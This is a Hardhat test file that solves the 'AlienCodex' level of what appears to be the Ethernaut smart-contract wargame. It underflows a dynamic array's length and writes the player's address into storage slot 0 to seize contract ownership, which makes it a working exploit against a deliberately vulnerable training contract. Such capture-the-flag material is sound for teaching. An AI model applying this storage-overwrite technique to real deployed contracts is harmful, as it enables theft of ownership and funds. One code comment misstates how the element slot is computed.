const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("AlienCodex", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("AlienCodex", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        await instance.make_contact();

        // Currently the owner of the instance should be the factory contract
        // We can check this by looking up the first storage slot
        let slot0content = await ethers.provider.getStorageAt(instance.address, 0);
        expect(slot0content).to.include(factory.address.replace("0x", "").toLowerCase());

        // The second storage slot should be filled with the `codex` array's length value (which is 0 initially)
        let slot1content = await ethers.provider.getStorageAt(instance.address, 1);
        expect(slot1content).to.equal(ethers.constants.HashZero);

        // Our goal is to locate the player's address in the first slot
        // For this purpose we whould have to:
        //  - calculate the slot index where `codex` array's element begin (at keccak256(codex.length))
        //  - underflow the array's length (0--)
        //  - calculate the difference between elements' starting slot and the max uint256 value

        const arrayElementsStartingSlot = ethers.BigNumber.from(
            ethers.utils.keccak256(
                "0x".concat(Array(31).fill("00").join("")).concat("01")
            )
        );

        const diff = ethers.constants.MaxUint256.sub(arrayElementsStartingSlot);

        const playerAddressToBytes32 = "0x".concat(player.address.replace("0x", "").padStart(32 * 2, "0"));

        await instance.retract(); // underflow `codex` array's length
        await instance.revise(diff.add(1), playerAddressToBytes32); // locate player.address in first slot (where the `owner` variable is located)
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});